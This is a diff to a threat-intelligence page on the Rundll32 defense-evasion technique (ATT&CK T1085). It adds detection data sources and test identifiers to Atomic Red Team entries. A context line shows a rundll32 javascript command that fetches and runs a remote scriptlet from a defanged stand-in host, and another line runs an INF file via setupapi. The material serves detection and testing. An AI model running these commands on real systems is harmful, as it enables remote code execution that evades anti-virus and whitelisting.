@@ -11,14 +11,20 @@ Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the 
 
 Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: ['Anti-virus', 'Application whitelisting', 'Digital Certificate Validation']
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['User']
 * Platforms: ['Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1085
 
@@ -339,7 +345,15 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                   'tags': ['attack.defense_evasion',
                            'attack.execution',
                            'attack.t1085'],
-                  'title': 'Suspicious Call by Ordinal'}}]
+                  'title': 'Suspicious Call by Ordinal'}},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['Binary file metadata']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['LOG-MD - B9', 'Binary file metadata']}]
 ```
 
 ## Potential Queries
@@ -354,7 +368,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Rundll32': {'atomic_tests': [{'description': 'Test '
+[{'Atomic Red Team Test - Rundll32': {'atomic_tests': [{'auto_generated_guid': 'cf3bdb9a-dd11-4b6c-b0d0-9e22b68a71be',
+                                                        'description': 'Test '
                                                                        'execution '
                                                                        'of a '
                                                                        'remote '
@@ -385,7 +400,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                                                                 'Payload With '
                                                                 'GetObject',
                                                         'supported_platforms': ['windows']},
-                                                       {'description': 'Test '
+                                                       {'auto_generated_guid': '638730e7-7aed-43dc-bf8c-8117f805f5bb',
+                                                        'description': 'Test '
                                                                        'execution '
                                                                        'of a '
                                                                        'command '
@@ -427,7 +443,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                                                                 'VBscript '
                                                                 'command',
                                                         'supported_platforms': ['windows']},
-                                                       {'dependencies': [{'description': 'Inf '
+                                                       {'auto_generated_guid': 'd91cae26-7fc1-457b-a854-34c8aad48c89',
+                                                        'dependencies': [{'description': 'Inf '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
@@ -491,7 +508,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                                                                 'advpack.dll '
                                                                 'Execution',
                                                         'supported_platforms': ['windows']},
-                                                       {'dependencies': [{'description': 'Inf '
+                                                       {'auto_generated_guid': '5e46a58e-cbf6-45ef-a289-ed7754603df9',
+                                                        'dependencies': [{'description': 'Inf '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
@@ -556,7 +574,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                                                                 'ieadvpack.dll '
                                                                 'Execution',
                                                         'supported_platforms': ['windows']},
-                                                       {'dependencies': [{'description': 'Inf '
+                                                       {'auto_generated_guid': '41fa324a-3946-401e-bbdd-d7991c628125',
+                                                        'dependencies': [{'description': 'Inf '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
@@ -627,7 +646,8 @@ rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsF
                                                                 'syssetup.dll '
                                                                 'Execution',
                                                         'supported_platforms': ['windows']},
-                                                       {'dependencies': [{'description': 'Inf '
+                                                       {'auto_generated_guid': '71d771cd-d6b3-4f34-bc76-a63d47a10b19',
+                                                        'dependencies': [{'description': 'Inf '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
